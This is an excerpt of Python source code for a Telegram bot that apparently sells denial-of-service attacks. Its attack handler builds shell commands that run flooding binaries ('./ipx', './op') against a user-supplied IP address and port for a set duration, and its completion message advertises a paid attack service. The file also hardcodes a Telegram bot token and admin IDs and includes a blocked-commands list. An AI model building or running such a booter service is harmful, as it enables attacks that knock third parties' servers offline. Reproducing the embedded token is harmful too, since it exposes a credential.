...
# Database Configuration Bsdk credit de @MERINO_OWNERS
...
# Bot Configuration
TELEGRAM_BOT_TOKEN = '8080745465:AAG5pb31kTbUg1sRsGljrAke6xIYPut67Tw'
ADMIN_USER_ID = 5712886230 
ADMIN_USER_ID = 5712886230
...
BLOCKED_COMMANDS = ['vim', 'shutdown', 'reboot', 'mv', 'dd']
...
async def list_users(update, context):
    try:
        ...
        users = list(users_collection.find())  # Convert to list

        if not users:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ No users found in the database.")
            return
        ...
        for user in users:
            ...
            user_list_message += f"{status} User ID: {user_id} - Expiry: {expiry_label}\n"
...
async def attack(update: Update, context: CallbackContext):
    ...
    if argument_type == 3:
        attack_command = f"./ipx {ip} {port} {duration}"
    elif argument_type == 4:
        attack_command = f"./ipx {ip} {port} {duration} 1800"
    elif argument_type == 5:
        attack_command = f"./op {ip} {port} {duration} 150"
...
async def run_attack(chat_id, attack_command, context):
    try:
        ...
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*BUY PAID SERVICE:- @Sankai10_oct_2k03 ATTACK TIME 240sec*", parse_mode='Markdown')
